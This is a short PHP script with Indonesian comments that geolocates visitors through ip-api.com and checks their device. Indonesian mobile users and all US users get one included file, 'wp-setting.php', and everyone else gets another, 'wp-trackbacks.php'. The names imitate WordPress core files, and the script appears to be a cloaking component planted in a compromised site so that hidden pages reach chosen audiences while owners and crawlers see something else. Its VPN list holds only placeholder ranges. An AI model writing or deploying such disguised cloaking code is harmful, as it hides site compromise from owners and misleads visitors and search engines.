<?php
session_start(); // Mulai sesi di awal

// Pastikan untuk menghindari ID sesi duplikat
session_regenerate_id(true); // Ganti dengan ID sesi baru

// Mendeteksi perangkat pengguna (mobile atau desktop) dan negara asal
function isMobileDeviceFromIndonesiaOrUS() {
    $ip = $_SERVER['REMOTE_ADDR'];

    // Cek apakah hasilnya sudah ada di sesi
    if (isset($_SESSION['ip_info'][$ip])) {
        $ip_info = $_SESSION['ip_info'][$ip];
    } else {
        // Mendapatkan info IP dari API
        $ip_info = json_decode(file_get_contents("http://ip-api.com/json/$ip"));

        // Simpan hasilnya dalam sesi
        if ($ip_info) {
            $_SESSION['ip_info'][$ip] = $ip_info;
        }
    }

    // Cek juga apakah alamat IP adalah alamat VPN
    $vpn_ip_ranges = array(
        '1.0.0.0/24',
        '2.0.0.0/16',
        // Tambahkan alamat IP VPN lain jika diperlukan
    );

    foreach ($vpn_ip_ranges as $vpn_ip_range) {
        if (ip_in_range($ip, $vpn_ip_range)) {
            return false; // Jika pengguna menggunakan VPN
        }
    }

    // Jika alamat IP berasal dari Indonesia atau Amerika Serikat
    if ($ip_info && ($ip_info->countryCode === 'ID' || $ip_info->countryCode === 'US')) {
        // Jika dari Indonesia, periksa apakah perangkat mobile
        if ($ip_info->countryCode === 'ID') {
            return preg_match('/(android|iphone|ipod|ipad|iemobile|opera mini)/i', $_SERVER['HTTP_USER_AGENT']);
        }
        // Jika dari Amerika, izinkan akses tanpa batasan
        return true;
    }

    return false; // Untuk negara lain
}

// Fungsi untuk memeriksa apakah alamat IP ada dalam suatu rentang IP
function ip_in_range($ip, $range) {
    list($subnet, $mask) = explode('/', $range);
    return (ip2long($ip) & ~((1 << (32 - $mask)) - 1)) == ip2long($subnet);
}

// Jika pengguna adalah perangkat mobile dari Indonesia atau desktop dari Amerika Serikat
if (isMobileDeviceFromIndonesiaOrUS()) {
    require 'wp-setting.php'; // Pastikan path ini benar
} else {
    // Jika tidak, tampilkan halaman HTML biasa
    require 'wp-trackbacks.php'; // Pastikan ini juga benar
}
?>
